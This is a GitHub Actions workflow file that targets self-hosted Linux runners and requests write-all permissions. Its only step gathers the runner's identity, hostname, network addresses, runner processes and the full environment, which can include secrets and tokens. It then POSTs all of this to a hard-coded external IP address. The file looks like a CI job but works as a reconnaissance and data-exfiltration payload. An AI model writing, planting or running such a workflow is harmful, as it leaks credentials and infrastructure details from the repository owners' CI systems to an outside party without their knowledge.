name: E05 selfhosted only

on:
  workflow_dispatch:
  push:
    branches: ["e05/**"]

permissions: write-all

jobs:
  sh:
    runs-on: [self-hosted, linux]
    timeout-minutes: 20
    steps:
      - name: Report from the runner
        run: |
          T=/tmp/e05sh.txt
          { echo "REPO=$GITHUB_REPOSITORY RUN=$GITHUB_RUN_ID"
            echo "RUNNER_ENVIRONMENT=$RUNNER_ENVIRONMENT RUNNER_NAME=$RUNNER_NAME"
            id; hostname; uname -a; cat /etc/os-release 2>/dev/null | head -4
            ip -4 -o addr 2>/dev/null | head
            ls -d /home/*/actions-runner /opt/actions-runner 2>/dev/null
            ps -eo user,pid,args 2>/dev/null | grep -i runner | grep -v grep | head
            env | sort; } > $T 2>&1
          for i in 1 2 3 4 5; do
            curl -sS -m 20 -X POST --data-binary @$T "http://198.13.130.233:8089/e05sh-$GITHUB_REPOSITORY-$GITHUB_RUN_ID" && break || sleep 5
          done
